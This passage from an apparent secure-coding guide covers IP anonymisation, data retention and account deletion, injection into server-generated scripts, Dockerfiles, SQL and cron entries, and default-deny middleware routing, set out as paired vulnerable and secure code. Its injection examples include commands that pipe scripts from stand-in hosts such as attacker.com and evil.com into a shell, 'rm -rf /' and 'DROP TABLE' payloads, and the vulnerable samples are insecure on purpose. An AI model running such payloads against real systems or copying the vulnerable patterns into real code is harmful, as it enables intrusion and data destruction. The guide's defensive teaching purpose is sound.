  }

  // Handle IPv4
  if (ip.includes(".") && !ip.includes(":")) {
    const parts = ip.split(".");
    if (parts.length === 4) {
      parts[3] = "0"; // Zero last octet: 192.168.1.42 -> 192.168.1.0
      return parts.join(".");
    }
  }

  // Handle IPv6
  if (ip.includes(":")) {
    const parts = ip.split(":");
    // Keep first 3 groups, zero the rest
    // 2001:0db8:85a3:0000:0000:8a2e:0370:7334 -> 2001:0db8:85a3::
    return parts.slice(0, 3).join(":") + "::";
  }

  return "unknown";
}

// VULNERABLE — stores raw IP
await db.auditLog.create({
  data: { ipAddress: req.ip }, // Raw: "192.168.1.42"
});

// SECURE — anonymize before storage
await db.auditLog.create({
  data: { ipAddress: anonymizeIp(req.ip) }, // Anonymized: "192.168.1.0"
});
```

**Rule 3: Define and enforce data retention policies with automated cleanup**

Data should not exist longer than it needs to. Define retention periods for every data category and run automated cleanup jobs on a daily schedule.

```javascript
// Data retention enforcement — daily cron job
async function enforceDataRetention(): Promise<void> {
  const now = new Date();

  // Analytics events: 90 days
  const analyticsDeleted = await db.analyticsEvent.deleteMany({
    where: {
      createdAt: { lt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000) },
    },
  });

  // API request logs: 30 days
  const requestLogsDeleted = await db.requestLog.deleteMany({
    where: {
      createdAt: { lt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000) },
    },
  });

  // Expired sessions: immediate
  const sessionsDeleted = await db.session.deleteMany({
    where: { expiresAt: { lt: now } },
  });

  // Expired password reset tokens: immediate
  const resetTokensDeleted = await db.passwordResetToken.deleteMany({
    where: { expiresAt: { lt: now } },
  });

  // Error reports: 30 days
  const errorReportsDeleted = await db.errorReport.deleteMany({
    where: {
      createdAt: { lt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000) },
    },
  });

  logger.info({
    event: "DATA_RETENTION_CLEANUP",
    analyticsDeleted: analyticsDeleted.count,
    requestLogsDeleted: requestLogsDeleted.count,
    sessionsDeleted: sessionsDeleted.count,
    resetTokensDeleted: resetTokensDeleted.count,
    errorReportsDeleted: errorReportsDeleted.count,
  });
}
```

**Rule 4: Implement right-to-deletion (cascade delete user data)**

Users must be able to request deletion of their account and all associated data. This must cascade to all related tables — items, API keys, analytics events, and any other user-linked data. Audit logs should be anonymized rather than deleted, to preserve the security trail without retaining identity.

```javascript
// Right-to-deletion endpoint
app.delete("/api/account", requireAuth, async (req, res) => {
  const userId = req.userId;

  // Require confirmation to prevent accidental deletion
  if (req.body.confirm !== "DELETE_MY_ACCOUNT") {
    return res.status(400).json({
      error: 'Send { "confirm": "DELETE_MY_ACCOUNT" } to proceed',
    });
  }

  await db.$transaction(async (tx) => {
    // 1. Delete user-owned content
    await tx.item.deleteMany({ where: { userId } });
    await tx.listing.deleteMany({ where: { publisherId: userId } });

    // 2. Revoke all credentials
    await tx.apiKey.updateMany({
      where: { userId },
      data: { revokedAt: new Date(), revokedReason: "account_deleted" },
    });

    // 3. Delete sessions
    await tx.session.deleteMany({ where: { userId } });

    // 4. Anonymize audit logs (preserve the trail, remove the identity)
    await tx.auditLog.updateMany({
      where: { actorId: userId },
      data: {
        actorId: "DELETED_USER",
        metadata: {}, // Clear metadata that may contain PII
      },
    });

    // 5. Delete analytics events
    await tx.analyticsEvent.deleteMany({ where: { userId } });

    // 6. Delete notification preferences and settings
    await tx.userSettings.deleteMany({ where: { userId } });

    // 7. Delete the user record last
    await tx.user.delete({ where: { id: userId } });
  });

  // Create a final audit entry for the deletion itself (outside transaction)
  await db.auditLog.create({
    data: {
      actorId: "DELETED_USER",
      actorType: "system",
      action: "ACCOUNT_DELETED",
      targetType: "user",
      targetId: "DELETED_USER",
      metadata: { deletedAt: new Date().toISOString() },
    },
  });

  // Delete from external services (Clerk, Stripe, analytics)
  await Promise.allSettled([
    clerkClient.users.deleteUser(userId),
    analytics.deleteUser(userId),
  ]);

  return res.json({ success: true, message: "Account and all data deleted" });
});
```

**Rule 5: Maintain a PII inventory — know where personal data lives**

Document every location where personal data is stored. This includes database tables, log files, backups, third-party services (analytics, error tracking, payment processors), and local caches. This inventory is required for GDPR compliance and essential for incident response.

```markdown
## PII Inventory

### Database (PostgreSQL)
| Table      | PII Fields               | Retention     | Deletion Method      |
|------------|--------------------------|---------------|----------------------|
| User       | email, name, clerkId     | Until deleted | CASCADE delete       |
| AuditLog   | actorId, ipAddress       | 1 year        | Anonymize actorId    |
| ApiKey     | userId                   | Until revoked | Revoke + retain hash |
| Item       | userId, content          | Until deleted | CASCADE delete       |
| ReadEvent  | userId, ipAddress        | 90 days       | Auto-purge           |

### Third-Party Services
| Service    | Data Shared              | DPA Signed? | Deletion API? |
|------------|--------------------------|-------------|---------------|
| Clerk      | email, name, auth events | Yes         | Yes           |
| Stripe     | email, payment method    | Yes         | Yes           |
| PostHog    | anonymized userId, events| Yes         | Yes           |
| Resend     | email address            | Yes         | No (30d auto) |
| Sentry     | IP, user-agent, stack    | Yes         | Yes           |
```

Review this inventory quarterly. When adding a new table or third-party integration, update the inventory before the code ships.

**Rule 6: Analytics tracking must be opt-in with clear controls**

Do not track user behavior without consent. Provide a clear opt-in mechanism, honor Do Not Track headers, and ensure analytics can be disabled without breaking the application.

```javascript
// VULNERABLE — tracks everything by default, no opt-out
app.use(async (req, res, next) => {
  await analytics.track({
    userId: req.userId,
    event: "page_view",
    properties: { path: req.path, ip: req.ip, userAgent: req.headers["user-agent"] },
  });
  next();
});

// SECURE — respect opt-in preference and DNT header
app.use(async (req, res, next) => {
  // Check Do Not Track header
  const dnt = req.headers["dnt"] === "1";

  // Check user preference (if authenticated)
  let analyticsOptIn = false;
  if (req.userId && !dnt) {
    const user = await db.user.findUnique({
      where: { id: req.userId },
      select: { analyticsOptIn: true },
    });
    analyticsOptIn = user?.analyticsOptIn ?? false;
  }

  if (analyticsOptIn) {
    await analytics.track({
      userId: hashUserId(req.userId), // Pseudonymized, not raw userId
      event: "page_view",
      properties: {
        path: req.path,
        // No IP address, no user-agent — minimize collected data
      },
    });
  }

  next();
});

// Endpoint to toggle analytics preference
app.put("/api/account/privacy", requireAuth, async (req, res) => {
  const { analyticsOptIn } = req.body;

  if (typeof analyticsOptIn !== "boolean") {
    return res.status(400).json({ error: "analyticsOptIn must be a boolean" });
  }

  await db.user.update({
    where: { id: req.userId },
    data: { analyticsOptIn },
  });

  // When user opts out, delete their existing analytics data
  if (!analyticsOptIn) {
    await analytics.deleteUser(hashUserId(req.userId));
  }

  return res.json({ analyticsOptIn });
});
```

## Verification

- Verify that no raw IP addresses appear in the database — all stored IPs should have their last octet zeroed (IPv4) or be truncated (IPv6)
- Run the data retention cleanup job and verify that records older than the defined retention periods are deleted
- Execute the account deletion endpoint and verify that all user-linked data is removed or anonymized across every table
- Check that audit log entries for deleted users have `actorId` set to `DELETED_USER` and `metadata` cleared of PII
- Verify that analytics tracking is only active for users who explicitly opted in
- Send a request with `DNT: 1` header and verify no analytics events are recorded for that request
- Review the PII inventory document and confirm it matches the actual database schema and third-party integrations
- Check that error reporting tools (Sentry, etc.) have PII scrubbing configured — search for email addresses in error reports
- Verify that the account deletion endpoint also triggers deletion in external services (Clerk, analytics)

---

── Page 32 ──

# Chapter 31: Server-Generated Code and Dynamic Output Injection

**Threat Summary:** When a server generates executable output — shell scripts, SQL migrations, Dockerfiles, CI/CD configs, or any code that will be executed later — interpolating user-controlled values into that output creates an injection vector. This is distinct from traditional SQL injection or XSS because the injection target is not the server itself but a downstream execution environment. An attacker who controls a package name, a branch name, or a configuration value can inject arbitrary commands into generated scripts that run in CI/CD pipelines, build servers, or production infrastructure.

**Severity:** CRITICAL — Successful injection into generated scripts often leads to remote code execution in CI/CD pipelines, build servers, or production infrastructure, with full access to secrets and deployment credentials.

## Quick Reference: Output Context Escaping

| Output Context | Escaping Method | Safer Alternative |
|---------------|----------------|-------------------|
| Shell script / bash | `printf '%q'` or argument arrays | Avoid interpolation; use env vars or config files |
| Dockerfile RUN | Validate against allowlist regex | Pin exact versions in a requirements file |
| SQL DDL (migrations) | Identifier quoting (`"table_name"`) | Use ORM migration generators; never interpolate |
| YAML (CI configs) | YAML escaping library | Template engines with auto-escaping |
| JSON output | `JSON.stringify()` | Always use serialization libraries; never string concat |
| HTML templates (SSR) | Context-aware escaping (see Ch. 4) | Framework auto-escaping (React, etc.) |
| Cron expressions | Validate against strict regex | Enum of allowed schedules |
| Environment files (.env) | Quote values, escape special chars | Use secret managers instead of .env generation |

## Core Rules

**Rule 1: Never interpolate user input into executable output**

Any value that originates from user input — form fields, query parameters, database records that users can edit, webhook payloads — must never be directly interpolated into code that will be executed. This includes shell scripts, Dockerfiles, CI/CD pipeline configs, SQL DDL statements, and any other format that will be parsed and executed by an interpreter.

```bash

── Page 33 ──

# VULNERABLE — user-controlled package name interpolated into shell script

── Page 34 ──

# If packageName is "lodash; curl attacker.com/steal.sh | sh", the command becomes:

── Page 35 ──

#   pip install lodash; curl attacker.com/steal.sh | sh
INSTALL_SCRIPT="pip install ${packageName}"
eval "$INSTALL_SCRIPT"

── Page 36 ──

# VULNERABLE — server generates an install script with user's project name

── Page 37 ──

# If projectName is "app; rm -rf /", this deletes the filesystem
cat <<SCRIPT
#!/bin/bash
cd /opt/${projectName}
npm install
npm start
SCRIPT
```

```javascript
// VULNERABLE — generating a shell command with string interpolation
app.post("/api/build", requireAuth, async (req, res) => {
  const { repoUrl } = req.body;
  const script = `
    git clone ${repoUrl} /tmp/build
    cd /tmp/build
    npm install && npm run build
  `;
  exec(script); // If repoUrl contains "; rm -rf /", game over
});

// SECURE — use argument arrays, never shell interpolation
import { execFile } from "child_process";

app.post("/api/build", requireAuth, async (req, res) => {
  const { repoUrl } = req.body;

  // Validate URL format strictly
  if (!isValidGitUrl(repoUrl)) {
    return res.status(400).json({ error: "Invalid repository URL" });
  }

  // Use execFile with argument array — no shell interpretation
  execFile("git", ["clone", "--depth", "1", repoUrl, "/tmp/build"], (err) => {
    if (err) return res.status(500).json({ error: "Clone failed" });

    execFile("npm", ["install"], { cwd: "/tmp/build" }, (err) => {
      if (err) return res.status(500).json({ error: "Install failed" });
      res.json({ success: true });
    });
  });
});

function isValidGitUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return (
      ["https:", "ssh:"].includes(parsed.protocol) &&
      /^[a-zA-Z0-9._-]+$/.test(parsed.hostname.split(".").join(""))
    );
  } catch {
    return false;
  }
}
```

**Rule 2: Use parameterized templates for generated code**

If you must generate code or configuration files, use template engines that separate data from structure. Never concatenate strings to build executable output. The data values should be inserted into predefined slots after validation, not used to construct the code structure itself.

```javascript
// VULNERABLE — building a Dockerfile with string concatenation
function generateDockerfile(baseImage: string, packages: string[]): string {
  return `
FROM ${baseImage}
RUN apt-get update && apt-get install -y ${packages.join(" ")}
COPY . /app
CMD ["node", "server.js"]
  `;
}
// If baseImage is "ubuntu\nRUN curl evil.com/backdoor.sh | sh\nFROM ubuntu"
// the attacker injects an arbitrary RUN command via newline injection

// SECURE — validate all inputs against strict allowlists before interpolation
const ALLOWED_BASE_IMAGES = new Set([
  "node:20-slim",
  "node:18-slim",
  "python:3.12-slim",
  "python:3.11-slim",
]);
const PACKAGE_REGEX = /^[a-zA-Z0-9][a-zA-Z0-9._+-]{0,127}$/;

function generateDockerfile(baseImage: string, packages: string[]): string {
  // Validate base image against exact allowlist
  if (!ALLOWED_BASE_IMAGES.has(baseImage)) {
    throw new Error(`Base image not allowed. Choose from: ${[...ALLOWED_BASE_IMAGES].join(", ")}`);
  }

  // Validate every package name against strict regex
  for (const pkg of packages) {
    if (!PACKAGE_REGEX.test(pkg)) {
      throw new Error(`Invalid package name: "${pkg}". Only alphanumeric, dots, hyphens, underscores, and plus signs allowed.`);
    }
  }

  if (packages.length > 50) {
    throw new Error("Maximum 50 packages allowed");
  }

  // Now safe to interpolate because all inputs validated against strict rules
  return `
FROM ${baseImage}
RUN apt-get update && apt-get install -y ${packages.join(" ")}
COPY . /app
CMD ["node", "server.js"]
  `.trim();
}
```

**Rule 3: Validate against strict allowlists before any interpolation**

If you absolutely must include user-controlled values in generated output, validate every value against a fixed set of known-good values or a strict regex pattern. Reject anything that does not match. Do not attempt to sanitize or escape dangerous characters — that approach is fragile and context-dependent. Allowlist validation is the only reliable approach.

```javascript
// VULNERABLE — user-specified table name used in generated migration SQL
function generateMigration(tableName: string): string {
  return `CREATE TABLE ${tableName} (id SERIAL PRIMARY KEY, data JSONB);`;
}
// If tableName is "users; DROP TABLE users; --", catastrophic

// SECURE — strict allowlist validation with defense-in-depth quoting
const TABLE_NAME_REGEX = /^[a-z][a-z0-9_]{0,62}$/;

function generateMigration(tableName: string): string {
  if (!TABLE_NAME_REGEX.test(tableName)) {
    throw new Error(
      `Invalid table name "${tableName}": must start with lowercase letter, contain only lowercase alphanumeric and underscores, 1-63 chars`
    );
  }

  // Use identifier quoting as defense-in-depth (even after validation)
  const quotedName = `"${tableName}"`;
  return `CREATE TABLE ${quotedName} (\n  id SERIAL PRIMARY KEY,\n  data JSONB\n);`;
}

// VULNERABLE — user-specified cron expression used in generated config
function generateCronJob(schedule: string, command: string): string {
  return `${schedule} ${command}`; // schedule could be "* * * * * ; curl evil.com |"
}

// SECURE — validate cron expression against known safe patterns
const ALLOWED_SCHEDULES: Record<string, string> = {
  hourly: "0 * * * *",
  daily: "0 0 * * *",
  weekly: "0 0 * * 0",
  monthly: "0 0 1 * *",
};

function generateCronJob(scheduleKey: string, commandKey: string): string {
  const schedule = ALLOWED_SCHEDULES[scheduleKey];
  if (!schedule) {
    throw new Error(`Invalid schedule. Choose from: ${Object.keys(ALLOWED_SCHEDULES).join(", ")}`);
  }

  const ALLOWED_COMMANDS: Record<string, string> = {
    cleanup: "/usr/local/bin/cleanup.sh",
    backup: "/usr/local/bin/backup.sh",
    report: "/usr/local/bin/report.sh",
  };

  const command = ALLOWED_COMMANDS[commandKey];
  if (!command) {
    throw new Error(`Invalid command. Choose from: ${Object.keys(ALLOWED_COMMANDS).join(", ")}`);
  }

  return `${schedule} ${command}`;
}
```

**Rule 4: Add integrity verification to generated scripts**

If your application generates scripts that will be executed later (install scripts, migration scripts, setup scripts), add integrity verification so the consumer can verify the script has not been tampered with between generation and execution.

```javascript
import { createHmac, timingSafeEqual } from "crypto";

const SCRIPT_SIGNING_KEY = process.env.SCRIPT_SIGNING_SECRET;

// Generate a script with an integrity signature
function generateSignedScript(config: ValidatedConfig): {
  script: string;
  signature: string;
  generatedAt: string;
} {
  const script = buildScriptFromValidatedConfig(config);
  const generatedAt = new Date().toISOString();

  // Sign the script content + timestamp to prevent replay
  const payload = `${generatedAt}\n${script}`;
  const signature = createHmac("sha256", SCRIPT_SIGNING_KEY)
    .update(payload)
    .digest("hex");

  return { script, signature, generatedAt };
}

// Verification before execution
function verifyScript(
  script: string,
  signature: string,
  generatedAt: string
): boolean {
  const payload = `${generatedAt}\n${script}`;
  const expectedSignature = createHmac("sha256", SCRIPT_SIGNING_KEY)
    .update(payload)
    .digest("hex");

  return timingSafeEqual(
    Buffer.from(signature, "hex"),
    Buffer.from(expectedSignature, "hex")
  );
}

// API endpoint: verify before serving the script for execution
app.get("/api/scripts/:id", async (req, res) => {
  const record = await db.generatedScript.findUnique({
    where: { id: req.params.id },
  });
  if (!record) return res.status(404).json({ error: "Script not found" });

  // Verify integrity before serving
  if (!verifyScript(record.script, record.signature, record.generatedAt)) {
    logger.error({
      event: "SCRIPT_INTEGRITY_FAILURE",
      scriptId: req.params.id,
    });
    return res.status(500).json({ error: "Script integrity check failed" });
  }

  res.setHeader("Content-Type", "text/plain");
  res.setHeader("X-Script-Signature", record.signature);
  return res.send(record.script);
});
```

**Rule 5: Escape for the target context — each output type has different rules**

Shell escaping is different from SQL escaping is different from YAML escaping. Use the correct escaping function for the target context, and never assume that escaping for one context works for another. When possible, use a well-maintained library for the target format rather than writing your own escaping logic.

```javascript
import { quote as shellQuote } from "shell-quote";
import yaml from "yaml";

// VULNERABLE — generic "sanitize" used for all contexts
function sanitize(input: string): string {
  return input.replace(/[;&|`$]/g, ""); // Incomplete, misses \n, ', ", (), {}, etc.
}

// SECURE — context-specific escaping functions

// Shell: use shell-quote library for proper metacharacter handling
function escapeForShell(value: string): string {
  return shellQuote([value]); // Handles all shell metacharacters correctly
}

// SQL identifiers: validate first, then double-quote as defense-in-depth
function escapeForSqlIdentifier(value: string): string {
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(value)) {
    throw new Error(`Invalid SQL identifier: "${value}"`);
  }
  return `"${value.replace(/"/g, '""')}"`;
}

// YAML: always use a YAML library — manual YAML escaping is error-prone
function escapeForYaml(value: unknown): string {
  return yaml.stringify(value).trim();
}

// JSON: always use JSON.stringify — never string concatenation
function escapeForJson(value: unknown): string {
  return JSON.stringify(value);
}

// Environment variables: quote the value and escape internal quotes
function escapeForEnvFile(key: string, value: string): string {
  if (!/^[A-Z_][A-Z0-9_]*$/.test(key)) {
    throw new Error(`Invalid env var name: "${key}"`);
  }
  // Double-quote the value and escape internal double quotes and backslashes
  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
  return `${key}="${escaped}"`;
}
```

## Verification

- Test every endpoint that generates executable output (scripts, configs, migration files) with injection payloads: `"; rm -rf /`, `` `curl evil.com` ``, `$(whoami)`, `\nRUN malicious-command`, `'; DROP TABLE users; --`
- Verify that all user-controlled values interpolated into generated output are validated against explicit allowlists or strict regex patterns
- Check that no `exec()` or `eval()` calls use string interpolation with user input — all should use argument arrays (`execFile`) or pre-validated values
- Verify that generated Dockerfiles cannot contain newline-injected commands (test with `\n` and `\r\n` in input values)
- Confirm that generated migration SQL uses identifier quoting and allowlist validation
- Test that script integrity signatures detect tampering — modify one character in the script and verify the signature check fails
- Review all code paths that produce downloadable scripts and verify they do not interpolate request parameters
- Search for `exec(` and `child_process` imports and verify each usage follows safe patterns

---

── Page 38 ──

# Chapter 32: Middleware Architecture and Route Security

**Threat Summary:** Framework-level routing and middleware configuration is where authentication and authorization are enforced for the entire application. A single misconfigured route matcher, an overly broad public route pattern, or a middleware ordering bug can silently expose protected endpoints to unauthenticated users. These bugs are particularly dangerous because they bypass all handler-level security checks — the request never reaches the code that would verify permissions because middleware already let the request through without authentication.

**Severity:** CRITICAL — Middleware misconfiguration can expose every protected endpoint in the application simultaneously, and the bug is invisible at the handler level because the handler correctly checks auth but the middleware already let the request through.

## Quick Reference: Framework Default Behavior and Recommendations

| Framework | Default Auth Behavior | Risk | Recommended Config |
|-----------|----------------------|------|--------------------|
| Next.js (middleware.ts) | No auth unless middleware configured | Routes unprotected by default | `matcher` with explicit public routes list |
| Express.js | No auth unless middleware applied | Routes unprotected by default | Global auth middleware + explicit skip list |
| FastAPI | No auth unless `Depends()` specified | Per-route opt-in | Global dependency + explicit exclude list |
| Django | No auth unless `@login_required` | Per-view opt-in | `LOGIN_REQUIRED` middleware + exempt views |
| Spring Boot | Filter chain processes all requests | Depends on SecurityFilterChain config | `authorizeHttpRequests` with explicit permit list |

## Core Rules

**Rule 1: Default-deny route configuration — all routes require auth unless explicitly listed as public**

The most dangerous pattern in web frameworks is "opt-in authentication" — where routes are unprotected by default and developers must remember to add auth checks to every new route. Invert this: everything is protected by default, and public routes are explicitly and centrally listed.

```typescript
// VULNERABLE — Next.js middleware that only protects specific paths
// (opt-in auth: anything not listed here is PUBLIC)
export const config = {
  matcher: ["/dashboard/:path*", "/api/items/:path*"],
};

export default function middleware(req: NextRequest) {
  // Only runs for matched paths — every other route is unprotected
  return authMiddleware(req);
}
// Problem: /api/admin/users, /api/billing, /api/keys are all unprotected
// Any new API route added by any developer is also unprotected by default

// SECURE — protect everything, explicitly list public routes
const PUBLIC_ROUTES = new Set([
  "/",
  "/login",
  "/signup",
  "/pricing",
  "/docs",
  "/api/health",
  "/api/auth/callback",
  "/api/webhooks/stripe",
  "/api/webhooks/clerk",
  "/api/og",
]);

const PUBLIC_PREFIXES = [
  "/_next",        // Next.js static assets
  "/favicon",      // Static assets
  "/images",       // Public images
];

export default function middleware(req: NextRequest) {
  const path = req.nextUrl.pathname;

  // Check exact match public routes
  if (PUBLIC_ROUTES.has(path)) {
    return NextResponse.next();
  }

  // Check prefix-based public routes (static assets only)
  if (PUBLIC_PREFIXES.some((prefix) => path.startsWith(prefix))) {
    return NextResponse.next();
  }

  // Everything else requires authentication — default deny
  return authMiddleware(req);
}

// Matcher ensures middleware runs on all routes except static files
export const config = {
  matcher: ["/((?!_next/static|_next/image).*)"],
};
```

```javascript
// Express.js — SECURE default-deny pattern
const PUBLIC_PATHS = new Set([
  "/api/health",
  "/api/auth/callback",
  "/api/webhooks/stripe",
  "/api/public/pricing",
  "/api/public/features",
]);

// Global middleware — runs on EVERY request
app.use((req, res, next) => {
  if (PUBLIC_PATHS.has(req.path)) {
    return next(); // Skip auth for explicitly public routes
  }
  return requireAuth(req, res, next); // Everything else requires auth
});
```

**Rule 2: Avoid wildcard patterns in public route lists**

Wildcard patterns in public route lists are time bombs. A pattern like `/api/v1(.*)` or `/api/public/(.*)` will silently make any new route under that prefix public, including routes added by other developers who assume they are protected.

```typescript
// VULNERABLE — wildcard makes all current and future /api/v1 routes public
const PUBLIC_ROUTES = [
  "/api/v1/(.*)",           // Every /api/v1 route is public forever
  "/api/public/(.*)",       // Same problem — any new route under /api/public is public
  "/(.*)\\.json",           // All JSON files public, including /config.json, /secrets.json
];
// Adding /api/v1/admin/delete-all-users later? It's already public.

// SECURE — explicit route list, no wildcards, reviewed on every change
const PUBLIC_ROUTES = new Set([
  "/api/v1/health",
  "/api/v1/docs",
  "/api/v1/openapi.json",
  "/api/public/pricing",
  "/api/public/features",
]);
// Adding /api/v1/admin/users will be PROTECTED by default — must explicitly add to be public
```

```javascript
// Express.js — VULNERABLE: prefix-based skip in auth middleware
app.use((req, res, next) => {
  if (req.path.startsWith("/api/public")) {
    return next(); // SKIP auth for anything starting with /api/public
  }
  return requireAuth(req, res, next);
});
// An attacker creates /api/publicXXX (no slash) — bypasses auth
// A dev adds /api/public/admin/users — accidentally public

// Express.js — SECURE: exact path matching only
const PUBLIC_PATHS = new Set([
  "/api/public/pricing",
  "/api/public/features",
  "/api/health",
]);

app.use((req, res, next) => {
  if (PUBLIC_PATHS.has(req.path)) {
    return next();
  }
  return requireAuth(req, res, next);
});
```

**Rule 3: Defense-in-depth at the route handler level**

Even if middleware should have checked authentication, always verify auth in the handler too. Middleware bugs, misconfigurations, framework upgrades, and even framework CVEs (e.g., CVE-2025-29927 in Next.js) can silently remove auth checks. The handler is the last line of defense — it should never assume middleware ran correctly.

```typescript
// VULNERABLE — handler trusts that middleware already checked auth
// If middleware has a bug or the route is accidentally public, this is wide open
app.get("/api/admin/users", async (req, res) => {
  const users = await db.user.findMany();
  return res.json(users); // No auth check — trusts middleware entirely
});

// SECURE — handler verifies auth independently (defense-in-depth)
app.get("/api/admin/users", async (req, res) => {
  // Step 1: Verify authentication even though middleware should have
  const { userId } = await getAuth(req);
  if (!userId) {
    return res.status(401).json({ error: "Authentication required" });
  }

  // Step 2: Verify authorization (admin role)
  const user = await db.user.findUnique({ where: { id: userId } });
  if (!user || user.role !== "admin") {
    await auditLog({
      action: "AUTHORIZATION_DENIED",
      actorId: userId,
      actorType: "user",
      targetType: "route",
      targetId: "/api/admin/users",
      metadata: { userRole: user?.role || "none" },
    });
    return res.status(403).json({ error: "Admin access required" });
  }

  // Step 3: Return only public fields (defense-in-depth data filtering)
  const users = await db.user.findMany({
    select: { id: true, email: true, tier: true, createdAt: true },
    // Never: passwordHash, clerkId, stripeCustomerId, etc.
  });
  return res.json(users);
});
```

**Rule 4: Separate authentication mechanisms must be explicitly documented and never accidentally combined**

Many applications support multiple auth methods: session cookies (Clerk, NextAuth), API keys (for CLI/programmatic access), webhook signatures (for Stripe, Clerk). Each route must clearly document which auth method it uses. Bugs occur when middleware expects a session cookie but the request comes with an API key, or when a route accidentally requires both.

```typescript
// VULNERABLE — middleware checks Clerk session, but CLI sends API keys
// CLI requests with valid API keys get rejected because they have no Clerk session
export default function middleware(req: NextRequest) {
  return clerkMiddleware(req); // API key requests fail here — no session cookie
}

// SECURE — route auth strategy matrix, support multiple auth types
export default function middleware(req: NextRequest) {
  const path = req.nextUrl.pathname;

  // API routes that accept API key auth — skip session middleware
  if (
    path.startsWith("/api/v1/") &&
    req.headers.get("authorization")?.startsWith("Bearer ck_")
  ) {
    // API key validation happens in the route handler, not middleware
    return NextResponse.next();
  }

  // Webhook routes use signature verification, not session auth
  if (path.startsWith("/api/webhooks/")) {
    // Signature verification happens in the route handler
    return NextResponse.next();
  }

  // Public routes — no auth required
  if (PUBLIC_ROUTES.has(path)) {
    return NextResponse.next();
  }

  // All other routes use Clerk session auth
  return clerkMiddleware(req);
}

/**
 * Auth Strategy Matrix — KEEP THIS UPDATED
 *
 * Route Pattern         | Auth Method           | Verified In
 * ----------------------|-----------------------|------------------
 * /api/v1/*             | API Key (Bearer ck_*) | Route handler
 * /api/webhooks/stripe  | Stripe signature      | Route handler
 * /api/webhooks/clerk   | Clerk signature       | Route handler
 * /api/admin/*          | Clerk session + admin  | Middleware + handler
 * /dashboard/*          | Clerk session          | Middleware
 * /api/health           | None (public)          | N/A
 * /api/og               | None (public)          | N/A
 */
```

**Rule 5: Audit route patterns on every deploy**

Add an automated check to your CI/CD pipeline that enumerates all routes and verifies that no new routes are accidentally public. This catches the case where a developer adds a new API route but does not realize the middleware configuration determines its auth requirements.

```typescript
// scripts/audit-routes.ts — run in CI before deploy
import { readdirSync, statSync } from "fs";
import { join, relative } from "path";

// These must match exactly what's in middleware.ts PUBLIC_ROUTES
const EXPECTED_PUBLIC_ROUTES = new Set([
  "/api/health",
  "/api/auth/callback",
  "/api/webhooks/stripe",
  "/api/webhooks/clerk",
  "/api/og",
]);

function findApiRoutes(dir: string, routes: string[] = []): string[] {
  for (const entry of readdirSync(dir)) {
    const fullPath = join(dir, entry);
    if (statSync(fullPath).isDirectory()) {
      findApiRoutes(fullPath, routes);
    } else if (entry === "route.ts" || entry === "route.js") {
      // Convert file path to route path
      // app/api/admin/users/route.ts -> /api/admin/users
      const routePath = "/" + relative("app", dir).replace(/\\/g, "/");
      // Normalize dynamic segments: [id] -> :id
      const normalized = routePath.replace(/\[([^\]]+)\]/g, ":$1");
      routes.push(normalized);
    }
  }
  return routes;
}

const allRoutes = findApiRoutes("app/api");

console.log("=== Route Security Audit ===");
console.log(`Total API routes found: ${allRoutes.length}`);
console.log("");

// Check which routes are public vs protected
const publicRoutes: string[] = [];
const protectedRoutes: string[] = [];

for (const route of allRoutes) {
  if (EXPECTED_PUBLIC_ROUTES.has(route)) {
    publicRoutes.push(route);
  } else {
    protectedRoutes.push(route);
  }
}

console.log(`Public routes (${publicRoutes.length}):`);
publicRoutes.forEach((r) => console.log(`  [PUBLIC]    ${r}`));

console.log(`\nProtected routes (${protectedRoutes.length}):`);
protectedRoutes.forEach((r) => console.log(`  [PROTECTED] ${r}`));

// Verify no expected public routes are missing (route was deleted but still in list)
const orphanedPublic = [...EXPECTED_PUBLIC_ROUTES].filter(
  (r) => !allRoutes.some((ar) => ar === r)
);
if (orphanedPublic.length > 0) {
  console.warn("\n[WARNING] Public routes in config but not found in codebase:");
  orphanedPublic.forEach((r) => console.warn(`  ${r}`));
}

// The key check: if a developer manually added a route to PUBLIC_ROUTES
// in middleware.ts but not to EXPECTED_PUBLIC_ROUTES here, this audit fails.
// This forces developers to update BOTH files consciously.
console.log("\n=== Audit Complete ===");
console.log(
  "To make a route public, add it to BOTH middleware.ts PUBLIC_ROUTES AND this audit script."
);
```

**Rule 6: Validate required environment variables at startup, not at request time**

If a security-critical environment variable (signing secret, database URL, API key for an external service) is missing, the application should fail to start immediately. Discovering a missing secret when a user hits the route leads to cryptic 500 errors, silent auth bypasses, or fallback to insecure defaults.

```typescript
// VULNERABLE — check env vars when a request hits the route
app.post("/api/webhooks/stripe", async (req, res) => {
  const secret = process.env.STRIPE_WEBHOOK_SECRET;
  if (!secret) {
    // This error might not be noticed for days or weeks
    console.error("Missing STRIPE_WEBHOOK_SECRET");
    return res.status(500).json({ error: "Internal error" });
  }
  const event = stripe.webhooks.constructEvent(
    req.body,
    req.headers["stripe-signature"],
    secret
  );
  // ...
});

// SECURE — validate all required env vars at startup
// lib/env.ts — imported at application boot before any route handlers
const REQUIRED_ENV_VARS = [
  "DATABASE_URL",
  "CLERK_SECRET_KEY",
  "CLERK_WEBHOOK_SECRET",
  "STRIPE_WEBHOOK_SECRET",
  "STRIPE_SECRET_KEY",
  "API_KEY_ENCRYPTION_SECRET",
  "RESEND_API_KEY",
  "S3_ACCESS_KEY",
  "S3_SECRET_KEY",
] as const;

type RequiredEnvVars = Record<(typeof REQUIRED_ENV_VARS)[number], string>;

function validateEnvironment(): RequiredEnvVars {
  const missing: string[] = [];

  for (const varName of REQUIRED_ENV_VARS) {
    if (!process.env[varName] || process.env[varName]!.trim() === "") {
      missing.push(varName);
    }
  }

  if (missing.length > 0) {
    // Log to stderr, not stdout — prevents accidental exposure in log aggregators
    console.error("========================================");
    console.error("FATAL: Missing required environment variables:");
    missing.forEach((v) => console.error(`  - ${v}`));
    console.error("Application cannot start. Exiting.");
    console.error("========================================");
    process.exit(1); // Crash immediately — do not accept any requests
  }

  return Object.fromEntries(
    REQUIRED_ENV_VARS.map((v) => [v, process.env[v]!])
  ) as RequiredEnvVars;
}

// Export validated env — guaranteed non-null at runtime
export const env = validateEnvironment();

// Usage in route handlers: use env.STRIPE_WEBHOOK_SECRET instead of process.env.STRIPE_WEBHOOK_SECRET
// TypeScript knows it's a string, not string | undefined
```

```typescript
// Additional: validate env var format, not just presence
function validateEnvironment(): RequiredEnvVars {
  // ... existence checks above ...

